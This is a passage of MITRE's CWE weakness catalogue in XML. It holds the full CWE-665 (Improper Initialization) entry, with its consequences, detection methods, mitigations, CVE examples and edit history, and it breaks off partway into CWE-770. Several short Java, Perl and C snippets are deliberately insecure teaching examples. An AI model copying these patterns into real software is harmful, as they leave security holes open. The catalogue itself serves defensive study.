					<ns0:Modification_Comment>updated Alternate_Terms, Background_Details, Observed_Examples, References, Relationship_Notes, Theoretical_Notes</ns0:Modification_Comment>
				</ns0:Modification>
				<ns0:Modification>
					<ns0:Modification_Name>CWE Content Team</ns0:Modification_Name>
					<ns0:Modification_Organization>MITRE</ns0:Modification_Organization>
					<ns0:Modification_Date>2023-01-31</ns0:Modification_Date>
					<ns0:Modification_Comment>updated Description</ns0:Modification_Comment>
				</ns0:Modification>
				<ns0:Modification>
					<ns0:Modification_Name>CWE Content Team</ns0:Modification_Name>
					<ns0:Modification_Organization>MITRE</ns0:Modification_Organization>
					<ns0:Modification_Date>2023-04-27</ns0:Modification_Date>
					<ns0:Modification_Comment>updated Relationships</ns0:Modification_Comment>
				</ns0:Modification>
				<ns0:Modification>
					<ns0:Modification_Name>CWE Content Team</ns0:Modification_Name>
					<ns0:Modification_Organization>MITRE</ns0:Modification_Organization>
					<ns0:Modification_Date>2023-06-29</ns0:Modification_Date>
					<ns0:Modification_Comment>updated Mapping_Notes</ns0:Modification_Comment>
				</ns0:Modification>
            <ns0:Previous_Entry_Name Date="2008-04-11">Link Following</ns0:Previous_Entry_Name>
            <ns0:Previous_Entry_Name Date="2009-05-27">Failure to Resolve Links Before File Access (aka 'Link Following')</ns0:Previous_Entry_Name>
         </ns0:Content_History>
      </ns0:Weakness>
      <ns0:Weakness ID="665" Name="Improper Initialization" Abstraction="Class" Structure="Simple" Status="Draft">
         <ns0:Description>The product does not initialize or incorrectly initializes a resource, which might leave the resource in an unexpected state when it is accessed or used.</ns0:Description>
         <ns0:Extended_Description>This can have security implications when the associated resource is expected to have certain properties or values, such as a variable that determines whether a user has been authenticated or not.</ns0:Extended_Description>
         <ns0:Related_Weaknesses>
            <ns0:Related_Weakness Nature="ChildOf" CWE_ID="664" View_ID="1000" Ordinal="Primary" />
         </ns0:Related_Weaknesses>
         <ns0:Weakness_Ordinalities>
            <ns0:Weakness_Ordinality>
               <ns0:Ordinality>Primary</ns0:Ordinality>
            </ns0:Weakness_Ordinality>
            <ns0:Weakness_Ordinality>
               <ns0:Ordinality>Resultant</ns0:Ordinality>
            </ns0:Weakness_Ordinality>
         </ns0:Weakness_Ordinalities>
         <ns0:Applicable_Platforms>
            <ns0:Language Class="Not Language-Specific" Prevalence="Undetermined" />
         </ns0:Applicable_Platforms>
         <ns0:Modes_Of_Introduction>
            <ns0:Introduction>
               <ns0:Phase>Implementation</ns0:Phase>
               <ns0:Note>This weakness can occur in code paths that are not well-tested, such as rare error conditions. This is because the use of uninitialized data would be noticed as a bug during frequently-used functionality.</ns0:Note>
            </ns0:Introduction>
            <ns0:Introduction>
               <ns0:Phase>Operation</ns0:Phase>
            </ns0:Introduction>
         </ns0:Modes_Of_Introduction>
         <ns0:Likelihood_Of_Exploit>Medium</ns0:Likelihood_Of_Exploit>
         <ns0:Common_Consequences>
            <ns0:Consequence>
               <ns0:Scope>Confidentiality</ns0:Scope>
               <ns0:Impact>Read Memory</ns0:Impact>
               <ns0:Impact>Read Application Data</ns0:Impact>
               <ns0:Note>When reusing a resource such as memory or a program variable, the original contents of that resource may not be cleared before it is sent to an untrusted party.</ns0:Note>
            </ns0:Consequence>
            <ns0:Consequence>
               <ns0:Scope>Access Control</ns0:Scope>
               <ns0:Impact>Bypass Protection Mechanism</ns0:Impact>
               <ns0:Note>If security-critical decisions rely on a variable having a "0" or equivalent value, and the programming language performs this initialization on behalf of the programmer, then a bypass of security may occur.</ns0:Note>
            </ns0:Consequence>
            <ns0:Consequence>
               <ns0:Scope>Availability</ns0:Scope>
               <ns0:Impact>DoS: Crash, Exit, or Restart</ns0:Impact>
               <ns0:Note>The uninitialized data may contain values that cause program flow to change in ways that the programmer did not intend. For example, if an uninitialized variable is used as an array index in C, then its previous contents may produce an index that is outside the range of the array, possibly causing a crash or an exit in other environments.</ns0:Note>
            </ns0:Consequence>
         </ns0:Common_Consequences>
         <ns0:Detection_Methods>
            <ns0:Detection_Method Detection_Method_ID="DM-2">
               <ns0:Method>Automated Dynamic Analysis</ns0:Method>
               <ns0:Description>
                  <html:p>This weakness can be detected using dynamic tools and techniques that interact with the software using large test suites with many diverse inputs, such as fuzz testing (fuzzing), robustness testing, and fault injection. The software's operation may slow down, but it should not become unstable, crash, or generate incorrect results.</html:p>
                  <html:p>Initialization problems may be detected with a stress-test by calling the software simultaneously from a large number of threads or processes, and look for evidence of any unexpected behavior. The software's operation may slow down, but it should not become unstable, crash, or generate incorrect results.</html:p>
               </ns0:Description>
               <ns0:Effectiveness>Moderate</ns0:Effectiveness>
            </ns0:Detection_Method>
            <ns0:Detection_Method Detection_Method_ID="DM-12">
               <ns0:Method>Manual Dynamic Analysis</ns0:Method>
               <ns0:Description>Identify error conditions that are not likely to occur during normal usage and trigger them. For example, run the program under low memory conditions, run with insufficient privileges or permissions, interrupt a transaction before it is completed, or disable connectivity to basic network services such as DNS. Monitor the software for any unexpected behavior. If you trigger an unhandled exception or similar error that was discovered and handled by the application's environment, it may still indicate unexpected conditions that were not handled by the application itself.</ns0:Description>
            </ns0:Detection_Method>
           <ns0:Detection_Method Detection_Method_ID="DM-14">
             <ns0:Method>Automated Static Analysis</ns0:Method>
             <ns0:Description>Automated static analysis, commonly referred to as Static Application Security Testing (SAST), can find some instances of this weakness by analyzing source code (or binary/compiled code) without having to execute it. Typically, this is done by building a model of data flow and control flow, then searching for potentially-vulnerable patterns that connect "sources" (origins of input) with "sinks" (destinations where the data interacts with external components, a lower layer such as the OS, etc.)</ns0:Description>
             <ns0:Effectiveness>High</ns0:Effectiveness>
           </ns0:Detection_Method>
         </ns0:Detection_Methods>
         <ns0:Potential_Mitigations>
            <ns0:Mitigation Mitigation_ID="MIT-3">
               <ns0:Phase>Requirements</ns0:Phase>
               <ns0:Strategy>Language Selection</ns0:Strategy>
               <ns0:Description>
                  <html:p>Use a language that does not allow this weakness to occur or provides constructs that make this weakness easier to avoid.</html:p>
                  <html:p>For example, in Java, if the programmer does not explicitly initialize a variable, then the code could produce a compile-time error (if the variable is local) or automatically initialize the variable to the default value for the variable's type. In Perl, if explicit initialization is not performed, then a default value of undef is assigned, which is interpreted as 0, false, or an equivalent value depending on the context in which the variable is accessed.</html:p>
               </ns0:Description>
            </ns0:Mitigation>
            <ns0:Mitigation>
               <ns0:Phase>Architecture and Design</ns0:Phase>
               <ns0:Description>Identify all variables and data stores that receive information from external sources, and apply input validation to make sure that they are only initialized to expected values.</ns0:Description>
            </ns0:Mitigation>
            <ns0:Mitigation>
               <ns0:Phase>Implementation</ns0:Phase>
               <ns0:Description>Explicitly initialize all your variables and other data stores, either during declaration or just before the first usage.</ns0:Description>
            </ns0:Mitigation>
            <ns0:Mitigation>
               <ns0:Phase>Implementation</ns0:Phase>
               <ns0:Description>Pay close attention to complex conditionals that affect initialization, since some conditions might not perform the initialization.</ns0:Description>
            </ns0:Mitigation>
            <ns0:Mitigation>
               <ns0:Phase>Implementation</ns0:Phase>
               <ns0:Description>Avoid race conditions (CWE-362) during initialization routines.</ns0:Description>
            </ns0:Mitigation>
            <ns0:Mitigation>
               <ns0:Phase>Build and Compilation</ns0:Phase>
               <ns0:Description>Run or compile your product with settings that generate warnings about uninitialized variables or data.</ns0:Description>
            </ns0:Mitigation>
            <ns0:Mitigation>
               <ns0:Phase>Testing</ns0:Phase>
               <ns0:Description>Use automated static analysis tools that target this type of weakness. Many modern techniques use data flow analysis to minimize the number of false positives. This is not a perfect solution, since 100% accuracy and coverage are not feasible.</ns0:Description>
            </ns0:Mitigation>
         </ns0:Potential_Mitigations>
         <ns0:Demonstrative_Examples>
            <ns0:Demonstrative_Example Demonstrative_Example_ID="DX-105">
               <ns0:Intro_Text>Here, a boolean initiailized field is consulted to ensure that initialization tasks are only completed once. However, the field is mistakenly set to true during static initialization, so the initialization code is never reached.</ns0:Intro_Text>
               <ns0:Example_Code Nature="Bad" Language="Java">
                  <html:div>private boolean initialized = true;<html:br />public void someMethod() {<html:div style="margin-left:1em;">
                        <html:div>if (!initialized) {<html:div style="margin-left:1em;">
                              <html:div>
                                 <html:br />
                                 <html:i>// perform initialization tasks</html:i>
                                 <html:br />...<html:br />
                                 <html:br />initialized = true;</html:div>
                           </html:div>}</html:div>
                     </html:div>
                  </html:div>
               </ns0:Example_Code>
            </ns0:Demonstrative_Example>
            <ns0:Demonstrative_Example Demonstrative_Example_ID="DX-54">
               <ns0:Intro_Text>The following code intends to limit certain operations to the administrator only.</ns0:Intro_Text>
               <ns0:Example_Code Nature="Bad" Language="Perl">
                  <html:div>$username = GetCurrentUser();<html:br />$state = GetStateData($username);<html:br />if (defined($state)) {<html:div style="margin-left:1em;">$uid = ExtractUserID($state);</html:div>}<html:br />
                     <html:br />
                     <html:i># do stuff</html:i>
                     <html:br />if ($uid == 0) {<html:div style="margin-left:1em;">DoAdminThings();</html:div>}</html:div>
               </ns0:Example_Code>
               <ns0:Body_Text>If the application is unable to extract the state information - say, due to a database timeout - then the $uid variable will not be explicitly set by the programmer. This will cause $uid to be regarded as equivalent to "0" in the conditional, allowing the original user to perform administrator actions. Even if the attacker cannot directly influence the state data, unexpected errors could cause incorrect privileges to be assigned to a user just by accident.</ns0:Body_Text>
            </ns0:Demonstrative_Example>
            <ns0:Demonstrative_Example Demonstrative_Example_ID="DX-106">
               <ns0:Intro_Text>The following code intends to concatenate a string to a variable and print the string.</ns0:Intro_Text>
               <ns0:Example_Code Nature="Bad" Language="C">
                  <html:div>char str[20];<html:br />strcat(str, "hello world");<html:br />printf("%s", str);</html:div>
               </ns0:Example_Code>
               <ns0:Body_Text>This might seem innocent enough, but str was not initialized, so it contains random memory. As a result, str[0] might not contain the null terminator, so the copy might start at an offset other than 0. The consequences can vary, depending on the underlying memory.</ns0:Body_Text>
               <ns0:Body_Text>If a null terminator is found before str[8], then some bytes of random garbage will be printed before the "hello world" string. The memory might contain sensitive information from previous uses, such as a password (which might occur as a result of CWE-14 or CWE-244). In this example, it might not be a big deal, but consider what could happen if large amounts of memory are printed out before the null terminator is found.</ns0:Body_Text>
               <ns0:Body_Text>If a null terminator isn't found before str[8], then a buffer overflow could occur, since strcat will first look for the null terminator, then copy 12 bytes starting with that location. Alternately, a buffer over-read might occur (CWE-126) if a null terminator isn't found before the end of the memory segment is reached, leading to a segmentation fault and crash.</ns0:Body_Text>
            </ns0:Demonstrative_Example>
         </ns0:Demonstrative_Examples>
         <ns0:Observed_Examples>
            <ns0:Observed_Example>
               <ns0:Reference>CVE-2001-1471</ns0:Reference>
               <ns0:Description>chain: an invalid value prevents a library file from being included, skipping initialization of key variables, leading to resultant eval injection.</ns0:Description>
               <ns0:Link>https://www.cve.org/CVERecord?id=CVE-2001-1471</ns0:Link>
            </ns0:Observed_Example>
            <ns0:Observed_Example>
               <ns0:Reference>CVE-2008-3637</ns0:Reference>
               <ns0:Description>Improper error checking in protection mechanism produces an uninitialized variable, allowing security bypass and code execution.</ns0:Description>
               <ns0:Link>https://www.cve.org/CVERecord?id=CVE-2008-3637</ns0:Link>
            </ns0:Observed_Example>
            <ns0:Observed_Example>
               <ns0:Reference>CVE-2008-4197</ns0:Reference>
               <ns0:Description>Use of uninitialized memory may allow code execution.</ns0:Description>
               <ns0:Link>https://www.cve.org/CVERecord?id=CVE-2008-4197</ns0:Link>
            </ns0:Observed_Example>
            <ns0:Observed_Example>
               <ns0:Reference>CVE-2008-2934</ns0:Reference>
               <ns0:Description>Free of an uninitialized pointer leads to crash and possible code execution.</ns0:Description>
               <ns0:Link>https://www.cve.org/CVERecord?id=CVE-2008-2934</ns0:Link>
            </ns0:Observed_Example>
            <ns0:Observed_Example>
               <ns0:Reference>CVE-2007-3749</ns0:Reference>
               <ns0:Description>OS kernel does not reset a port when starting a setuid program, allowing local users to access the port and gain privileges.</ns0:Description>
               <ns0:Link>https://www.cve.org/CVERecord?id=CVE-2007-3749</ns0:Link>
            </ns0:Observed_Example>
            <ns0:Observed_Example>
               <ns0:Reference>CVE-2008-0063</ns0:Reference>
               <ns0:Description>Product does not clear memory contents when generating an error message, leading to information leak.</ns0:Description>
               <ns0:Link>https://www.cve.org/CVERecord?id=CVE-2008-0063</ns0:Link>
            </ns0:Observed_Example>
            <ns0:Observed_Example>
               <ns0:Reference>CVE-2008-0062</ns0:Reference>
               <ns0:Description>Lack of initialization triggers NULL pointer dereference or double-free.</ns0:Description>
               <ns0:Link>https://www.cve.org/CVERecord?id=CVE-2008-0062</ns0:Link>
            </ns0:Observed_Example>
            <ns0:Observed_Example>
               <ns0:Reference>CVE-2008-0081</ns0:Reference>
               <ns0:Description>Uninitialized variable leads to code execution in popular desktop application.</ns0:Description>
               <ns0:Link>https://www.cve.org/CVERecord?id=CVE-2008-0081</ns0:Link>
            </ns0:Observed_Example>
            <ns0:Observed_Example>
               <ns0:Reference>CVE-2008-3688</ns0:Reference>
               <ns0:Description>chain: Uninitialized variable leads to infinite loop.</ns0:Description>
               <ns0:Link>https://www.cve.org/CVERecord?id=CVE-2008-3688</ns0:Link>
            </ns0:Observed_Example>
            <ns0:Observed_Example>
               <ns0:Reference>CVE-2008-3475</ns0:Reference>
               <ns0:Description>chain: Improper initialization leads to memory corruption.</ns0:Description>
               <ns0:Link>https://www.cve.org/CVERecord?id=CVE-2008-3475</ns0:Link>
            </ns0:Observed_Example>
            <ns0:Observed_Example>
               <ns0:Reference>CVE-2008-5021</ns0:Reference>
               <ns0:Description>Composite: race condition allows attacker to modify an object while it is still being initialized, causing software to access uninitialized memory.</ns0:Description>
               <ns0:Link>https://www.cve.org/CVERecord?id=CVE-2008-5021</ns0:Link>
            </ns0:Observed_Example>
	   <ns0:Observed_Example>
	     <ns0:Reference>CVE-2005-1036</ns0:Reference>
	     <ns0:Description>Chain: Bypass of access restrictions due to improper authorization (CWE-862) of a user results from an improperly initialized (CWE-909) I/O permission bitmap</ns0:Description>
	     <ns0:Link>https://www.cve.org/CVERecord?id=CVE-2005-1036</ns0:Link>
	   </ns0:Observed_Example>
            <ns0:Observed_Example>
               <ns0:Reference>CVE-2008-3597</ns0:Reference>
               <ns0:Description>chain: game server can access player data structures before initialization has happened leading to NULL dereference</ns0:Description>
               <ns0:Link>https://www.cve.org/CVERecord?id=CVE-2008-3597</ns0:Link>
            </ns0:Observed_Example>
            <ns0:Observed_Example>
               <ns0:Reference>CVE-2009-2692</ns0:Reference>
               <ns0:Description>chain: uninitialized function pointers can be dereferenced allowing code execution</ns0:Description>
               <ns0:Link>https://www.cve.org/CVERecord?id=CVE-2009-2692</ns0:Link>
            </ns0:Observed_Example>
            <ns0:Observed_Example>
               <ns0:Reference>CVE-2009-0949</ns0:Reference>
               <ns0:Description>chain: improper initialization of memory can lead to NULL dereference</ns0:Description>
               <ns0:Link>https://www.cve.org/CVERecord?id=CVE-2009-0949</ns0:Link>
            </ns0:Observed_Example>
            <ns0:Observed_Example>
               <ns0:Reference>CVE-2009-3620</ns0:Reference>
               <ns0:Description>chain: some unprivileged ioctls do not verify that a structure has been initialized before invocation, leading to NULL dereference</ns0:Description>
               <ns0:Link>https://www.cve.org/CVERecord?id=CVE-2009-3620</ns0:Link>
            </ns0:Observed_Example>
         </ns0:Observed_Examples>
         <ns0:Taxonomy_Mappings>
            <ns0:Taxonomy_Mapping Taxonomy_Name="PLOVER">
               <ns0:Entry_Name>Incorrect initialization</ns0:Entry_Name>
            </ns0:Taxonomy_Mapping>
            <ns0:Taxonomy_Mapping Taxonomy_Name="CERT C Secure Coding">
               <ns0:Entry_ID>ARR02-C</ns0:Entry_ID>
               <ns0:Entry_Name>Explicitly specify array bounds, even if implicitly defined by an initializer</ns0:Entry_Name>
            </ns0:Taxonomy_Mapping>
            <ns0:Taxonomy_Mapping Taxonomy_Name="The CERT Oracle Secure Coding Standard for Java (2011)">
               <ns0:Entry_ID>DCL00-J</ns0:Entry_ID>
               <ns0:Entry_Name>Prevent class initialization cycles</ns0:Entry_Name>
            </ns0:Taxonomy_Mapping>
            <ns0:Taxonomy_Mapping Taxonomy_Name="Software Fault Patterns">
               <ns0:Entry_ID>SFP4</ns0:Entry_ID>
               <ns0:Entry_Name>Unchecked Status Condition</ns0:Entry_Name>
            </ns0:Taxonomy_Mapping>
         </ns0:Taxonomy_Mappings>
         <ns0:Related_Attack_Patterns>
            <ns0:Related_Attack_Pattern CAPEC_ID="26" />
            <ns0:Related_Attack_Pattern CAPEC_ID="29" />
         </ns0:Related_Attack_Patterns>
         <ns0:References>
            <ns0:Reference External_Reference_ID="REF-436" />
            <ns0:Reference External_Reference_ID="REF-437" />
            <ns0:Reference External_Reference_ID="REF-62" Section="Chapter 7, &quot;Variable Initialization&quot;, Page 312" />
         </ns0:References>
         <ns0:Mapping_Notes>
            <ns0:Usage>Allowed-with-Review</ns0:Usage>
            <ns0:Rationale>This CWE entry is a Class and might have Base-level children that would be more appropriate</ns0:Rationale>
            <ns0:Comments>Examine children of this entry to see if there is a better fit</ns0:Comments>
            <ns0:Reasons>
               <ns0:Reason Type="Abstraction" />
            </ns0:Reasons>
         </ns0:Mapping_Notes>
         <ns0:Content_History>
            <ns0:Submission>
               <ns0:Submission_Name>PLOVER</ns0:Submission_Name>
               <ns0:Submission_Date>2008-04-11</ns0:Submission_Date>
               <ns0:Submission_Version>Draft 9</ns0:Submission_Version>
               <ns0:Submission_ReleaseDate>2008-04-11</ns0:Submission_ReleaseDate>
            </ns0:Submission>
            <ns0:Modification>
               <ns0:Modification_Name>Sean Eidemiller</ns0:Modification_Name>
               <ns0:Modification_Organization>Cigital</ns0:Modification_Organization>
               <ns0:Modification_Date>2008-07-01</ns0:Modification_Date>
               <ns0:Modification_Comment>added/updated demonstrative examples</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>Eric Dalci</ns0:Modification_Name>
               <ns0:Modification_Organization>Cigital</ns0:Modification_Organization>
               <ns0:Modification_Date>2008-07-01</ns0:Modification_Date>
               <ns0:Modification_Comment>updated Potential_Mitigations, Time_of_Introduction</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CWE Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>MITRE</ns0:Modification_Organization>
               <ns0:Modification_Date>2008-09-08</ns0:Modification_Date>
               <ns0:Modification_Comment>updated Relationships, Taxonomy_Mappings</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CWE Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>MITRE</ns0:Modification_Organization>
               <ns0:Modification_Date>2008-11-24</ns0:Modification_Date>
               <ns0:Modification_Comment>updated Relationships, Taxonomy_Mappings</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CWE Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>MITRE</ns0:Modification_Organization>
               <ns0:Modification_Date>2009-01-12</ns0:Modification_Date>
               <ns0:Modification_Comment>updated Common_Consequences, Demonstrative_Examples, Description, Likelihood_of_Exploit, Modes_of_Introduction, Name, Observed_Examples, Potential_Mitigations, References, Relationships, Weakness_Ordinalities</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CWE Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>MITRE</ns0:Modification_Organization>
               <ns0:Modification_Date>2009-03-10</ns0:Modification_Date>
               <ns0:Modification_Comment>updated Potential_Mitigations</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CWE Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>MITRE</ns0:Modification_Organization>
               <ns0:Modification_Date>2009-05-27</ns0:Modification_Date>
               <ns0:Modification_Comment>updated Description, Relationships</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CWE Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>MITRE</ns0:Modification_Organization>
               <ns0:Modification_Date>2009-07-27</ns0:Modification_Date>
               <ns0:Modification_Comment>updated Related_Attack_Patterns</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CWE Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>MITRE</ns0:Modification_Organization>
               <ns0:Modification_Date>2009-10-29</ns0:Modification_Date>
               <ns0:Modification_Comment>updated Common_Consequences</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CWE Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>MITRE</ns0:Modification_Organization>
               <ns0:Modification_Date>2010-02-16</ns0:Modification_Date>
               <ns0:Modification_Comment>updated Potential_Mitigations</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CWE Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>MITRE</ns0:Modification_Organization>
               <ns0:Modification_Date>2010-04-05</ns0:Modification_Date>
               <ns0:Modification_Comment>updated Applicable_Platforms</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CWE Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>MITRE</ns0:Modification_Organization>
               <ns0:Modification_Date>2010-06-21</ns0:Modification_Date>
               <ns0:Modification_Comment>updated Detection_Factors, Potential_Mitigations</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CWE Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>MITRE</ns0:Modification_Organization>
               <ns0:Modification_Date>2010-09-27</ns0:Modification_Date>
               <ns0:Modification_Comment>updated Observed_Examples</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CWE Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>MITRE</ns0:Modification_Organization>
               <ns0:Modification_Date>2011-06-01</ns0:Modification_Date>
               <ns0:Modification_Comment>updated Common_Consequences, Relationships, Taxonomy_Mappings</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CWE Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>MITRE</ns0:Modification_Organization>
               <ns0:Modification_Date>2011-09-13</ns0:Modification_Date>
               <ns0:Modification_Comment>updated Relationships, Taxonomy_Mappings</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CWE Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>MITRE</ns0:Modification_Organization>
               <ns0:Modification_Date>2012-05-11</ns0:Modification_Date>
               <ns0:Modification_Comment>updated Demonstrative_Examples, References, Relationships, Taxonomy_Mappings</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CWE Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>MITRE</ns0:Modification_Organization>
               <ns0:Modification_Date>2013-02-21</ns0:Modification_Date>
               <ns0:Modification_Comment>updated Demonstrative_Examples, Relationships</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CWE Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>MITRE</ns0:Modification_Organization>
               <ns0:Modification_Date>2014-07-30</ns0:Modification_Date>
               <ns0:Modification_Comment>updated Relationships, Taxonomy_Mappings</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CWE Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>MITRE</ns0:Modification_Organization>
               <ns0:Modification_Date>2015-12-07</ns0:Modification_Date>
               <ns0:Modification_Comment>updated Relationships</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CWE Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>MITRE</ns0:Modification_Organization>
               <ns0:Modification_Date>2017-01-19</ns0:Modification_Date>
               <ns0:Modification_Comment>updated Type</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CWE Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>MITRE</ns0:Modification_Organization>
               <ns0:Modification_Date>2017-11-08</ns0:Modification_Date>
               <ns0:Modification_Comment>updated References, Taxonomy_Mappings</ns0:Modification_Comment>
            </ns0:Modification>
				<ns0:Modification>
					<ns0:Modification_Name>CWE Content Team</ns0:Modification_Name>
					<ns0:Modification_Organization>MITRE</ns0:Modification_Organization>
					<ns0:Modification_Date>2019-01-03</ns0:Modification_Date>
					<ns0:Modification_Comment>updated Related_Attack_Patterns, Relationships, Taxonomy_Mappings</ns0:Modification_Comment>
				</ns0:Modification>
				<ns0:Modification>
					<ns0:Modification_Name>CWE Content Team</ns0:Modification_Name>
					<ns0:Modification_Organization>MITRE</ns0:Modification_Organization>
					<ns0:Modification_Date>2019-06-20</ns0:Modification_Date>
					<ns0:Modification_Comment>updated Relationships</ns0:Modification_Comment>
				</ns0:Modification>
				<ns0:Modification>
					<ns0:Modification_Name>CWE Content Team</ns0:Modification_Name>
					<ns0:Modification_Organization>MITRE</ns0:Modification_Organization>
					<ns0:Modification_Date>2020-02-24</ns0:Modification_Date>
					<ns0:Modification_Comment>updated Relationships</ns0:Modification_Comment>
				</ns0:Modification>
				<ns0:Modification>
					<ns0:Modification_Name>CWE Content Team</ns0:Modification_Name>
					<ns0:Modification_Organization>MITRE</ns0:Modification_Organization>
					<ns0:Modification_Date>2020-06-25</ns0:Modification_Date>
					<ns0:Modification_Comment>updated Relationships</ns0:Modification_Comment>
				</ns0:Modification>
				<ns0:Modification>
					<ns0:Modification_Name>CWE Content Team</ns0:Modification_Name>
					<ns0:Modification_Organization>MITRE</ns0:Modification_Organization>
					<ns0:Modification_Date>2020-08-20</ns0:Modification_Date>
					<ns0:Modification_Comment>updated Relationships</ns0:Modification_Comment>
				</ns0:Modification>
				<ns0:Modification>
					<ns0:Modification_Name>CWE Content Team</ns0:Modification_Name>
					<ns0:Modification_Organization>MITRE</ns0:Modification_Organization>
					<ns0:Modification_Date>2020-12-10</ns0:Modification_Date>
					<ns0:Modification_Comment>updated Relationships</ns0:Modification_Comment>
				</ns0:Modification>
				<ns0:Modification>
					<ns0:Modification_Name>CWE Content Team</ns0:Modification_Name>
					<ns0:Modification_Organization>MITRE</ns0:Modification_Organization>
					<ns0:Modification_Date>2021-03-15</ns0:Modification_Date>
					<ns0:Modification_Comment>updated Observed_Examples</ns0:Modification_Comment>
				</ns0:Modification>
				<ns0:Modification>
					<ns0:Modification_Name>CWE Content Team</ns0:Modification_Name>
					<ns0:Modification_Organization>MITRE</ns0:Modification_Organization>
					<ns0:Modification_Date>2023-01-31</ns0:Modification_Date>
					<ns0:Modification_Comment>updated Description, Potential_Mitigations, Relationships</ns0:Modification_Comment>
				</ns0:Modification>
				<ns0:Modification>
					<ns0:Modification_Name>CWE Content Team</ns0:Modification_Name>
					<ns0:Modification_Organization>MITRE</ns0:Modification_Organization>
					<ns0:Modification_Date>2023-04-27</ns0:Modification_Date>
					<ns0:Modification_Comment>updated Detection_Factors, References, Relationships</ns0:Modification_Comment>
				</ns0:Modification>
				<ns0:Modification>
					<ns0:Modification_Name>CWE Content Team</ns0:Modification_Name>
					<ns0:Modification_Organization>MITRE</ns0:Modification_Organization>
					<ns0:Modification_Date>2023-06-29</ns0:Modification_Date>
					<ns0:Modification_Comment>updated Mapping_Notes</ns0:Modification_Comment>
				</ns0:Modification>
            <ns0:Previous_Entry_Name Date="2009-01-12">Incorrect or Incomplete Initialization</ns0:Previous_Entry_Name>
         </ns0:Content_History>
      </ns0:Weakness>
      <ns0:Weakness ID="770" Name="Allocation of Resources Without Limits or Throttling" Abstraction="Base" Structure="Simple" Status="Incomplete">
         <ns0:Description>The product allocates a reusable resource or group of resources on behalf of an actor without imposing any restrictions on the size or number of resources that can be allocated, in violation of the intended security policy for that actor.</ns0:Description>
         <ns0:Extended_Description><html:p>Code frequently has to work with limited resources, so programmers must be careful to ensure that resources are not consumed too quickly, or too easily.  Without use of quotas, resource limits, or other protection mechanisms, it can be easy for an attacker to consume many resources by rapidly making many requests, or causing larger resources to be used than is needed. When too many resources are allocated, or if a single resource is too large, then it can prevent the code from working correctly, possibly leading to a denial of service.</html:p></ns0:Extended_Description>
         <ns0:Related_Weaknesses>
            <ns0:Related_Weakness Nature="ChildOf" CWE_ID="400" View_ID="1000" Ordinal="Primary" />
            <ns0:Related_Weakness Nature="ChildOf" CWE_ID="665" View_ID="1000" />
            <ns0:Related_Weakness Nature="ChildOf" CWE_ID="400" View_ID="1003" Ordinal="Primary" />
         </ns0:Related_Weaknesses>
         <ns0:Applicable_Platforms>
            <ns0:Language Class="Not Language-Specific" Prevalence="Often" />
         </ns0:Applicable_Platforms>
         <ns0:Modes_Of_Introduction>
            <ns0:Introduction>
               <ns0:Phase>Architecture and Design</ns0:Phase>
               <ns0:Note>OMISSION: This weakness is caused by missing a security tactic during the architecture and design phase.</ns0:Note>
            </ns0:Introduction>
            <ns0:Introduction>
               <ns0:Phase>Implementation</ns0:Phase>
            </ns0:Introduction>
            <ns0:Introduction>
               <ns0:Phase>Operation</ns0:Phase>
            </ns0:Introduction>
            <ns0:Introduction>
               <ns0:Phase>System Configuration</ns0:Phase>
            </ns0:Introduction>
         </ns0:Modes_Of_Introduction>
         <ns0:Likelihood_Of_Exploit>High</ns0:Likelihood_Of_Exploit>
         <ns0:Common_Consequences>
            <ns0:Consequence>
               <ns0:Scope>Availability</ns0:Scope>
               <ns0:Impact>DoS: Resource Consumption (CPU)</ns0:Impact>
               <ns0:Impact>DoS: Resource Consumption (Memory)</ns0:Impact>
               <ns0:Impact>DoS: Resource Consumption (Other)</ns0:Impact>
